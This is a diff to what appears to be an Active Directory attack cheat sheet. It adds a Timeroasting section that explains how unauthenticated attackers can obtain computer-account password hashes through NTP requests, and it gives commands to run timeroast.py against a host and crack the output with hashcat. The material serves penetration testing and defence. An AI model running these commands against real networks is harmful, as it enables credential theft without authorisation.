@@ -64,7 +64,8 @@
     - [Pass-the-Ticket Diamond Tickets](#pass-the-ticket-diamond-tickets)
     - [Pass-the-Ticket Sapphire Tickets](#pass-the-ticket-sapphire-tickets)
   - [Kerberoasting](#kerberoasting)
-  - [KRB_AS_REP Roasting](#krbasrep-roasting)
+  - [KRB_AS_REP Roasting](#krb_as_rep-roasting)
+  - [Timeroasting](#timeroasting)
   - [Pass-the-Hash](#pass-the-hash)
   - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
     - [Using impacket](#using-impacket)
@@ -2040,6 +2041,17 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 
 **Mitigations**: 
 * All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
+
+
+## Timeroasting
+
+> Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID
+
+* [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
+    ```ps1
+    sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
+    hashcat -m 31300 ntp-hashes.txt
+    ```
 
 
 ## Pass-the-Hash
@@ -4326,3 +4338,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)
 * [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf](https://adsecurity.org/?p=3592)
 * [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
+* [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
+* [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
